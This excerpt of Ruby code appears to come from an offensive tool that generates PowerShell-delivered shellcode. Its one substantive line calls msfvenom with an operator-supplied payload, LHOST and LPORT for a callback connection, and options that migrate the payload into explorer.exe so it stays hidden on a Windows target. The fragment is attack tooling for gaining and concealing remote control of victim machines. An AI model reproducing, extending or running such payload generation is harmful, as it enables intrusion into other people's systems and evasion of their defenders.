...
def gen_PS_shellcode()
    ...
    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} prependmigrate=true prependmigrateprocess=explorer.exe --platform windows --smallest -f raw > raw_shellcode_temp")
